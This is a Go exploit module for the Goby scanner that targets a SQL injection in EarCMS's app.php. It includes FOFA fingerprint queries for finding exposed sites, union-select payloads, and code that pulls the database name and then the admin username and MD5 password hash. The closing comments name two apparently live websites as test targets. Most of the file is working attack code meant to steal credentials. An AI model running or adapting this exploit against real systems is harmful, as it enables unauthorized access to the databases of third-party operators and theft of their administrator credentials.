package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "earcms app.php sqli vulnerability",
    "Description": "<p>Earcms is a platform for distributing software.</p><p>Earcms foreground app.php, PDO is used incorrectly, resulting in SQL injection.</p>",
    "Product": "Earcms",
    "Homepage": "http://www.idaxian.com/",
    "DisclosureDate": "2022-07-16",
    "Author": "hututuZH",
    "FofaQuery": "body=\"earcms\" || body=\"/static/index/propeller.svg\" || body=\"/static/index/plane.svg\" || body=\"/images/propeller.svg\"",
    "GobyQuery": "body=\"earcms\" || body=\"/static/index/propeller.svg\" || body=\"/static/index/plane.svg\" || body=\"/images/propeller.svg\"",
    "Level": "3",
    "Impact": "<p>Earcms foreground app.php, the use of PDO is wrong, which leads to SQL injection. You can get the account and password.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.idaxian.com/\">http://www.idaxian.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "/app.php/'union(SELECT(1),2,3,database(),3,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1);"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "earcms app.php sql 注入漏洞",
            "Product": "Earcms",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">EarCMS用于分发软件的平台。</span><br></p><p><span style=\"color: var(--primaryFont-color);\">EarCMS前台app.php中，pdo使用错误，导致sql注入。<br></span></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.idaxian.com/\">http://www.idaxian.com/</a><br></p>",
            "Impact": "<p>EarCMS前台app.php中，<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">pdo使用错误，导致sql注入，可以获得账号密码。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "earcms app.php sqli vulnerability",
            "Product": "Earcms",
            "Description": "<p>Earcms is a platform for distributing software.</p><p>Earcms foreground app.php, PDO is used incorrectly, resulting in SQL injection.<br></p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.idaxian.com/\">http://www.idaxian.com/</a><br></p>",
            "Impact": "<p>Earcms foreground app.php, the use of PDO is wrong, which leads to SQL injection. You can get the account and password.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10693"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/app.php/'union(SELECT(1),2,3,md5(88),3,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1);"
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "2a38a4a9316c49e5a833517c45d31070")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sql := ss.Params["sql"].(string)

			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + sql); err == nil &&strings.Contains(resp.RawBody,"</i>")&&strings.Contains(resp.RawBody,"</span>"){

				regularMatch,_:=regexp.Compile("</i>(.*)?</span>")
				dataBase:=regularMatch.FindString(resp.Utf8Html)[4:]
				uri :="/app.php/'union(SELECT(1),2,3,in_adminname,4,6,in_adminpassword,8,9,0,1,2,4,4,5,6,in_adminpassword,8,9,0,(1)from("+dataBase[:len(dataBase)-7]+".prefix_admin));"

				if respName, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri); err == nil {
					regularMatchUser ,_:=regexp.Compile("</i>(.*)?</span>")
					userName:=regularMatchUser.FindString(respName.Utf8Html)[4:]
					regularMatchPass,_:=regexp.Compile("<p>(.*)Build 8")
					password:=regularMatchPass.FindString(respName.Utf8Html)[3:]
					expResult.Success = true
					expResult.Output ="username:"+userName[:len(userName)-7]+"\npassword:"+password[:32]+"\nyou need to decrypt MD5"
				}
			}
			return expResult
		},
	))
}

//测试ip
//https://u7yx.com/
//https://app.changfengkeji.cc/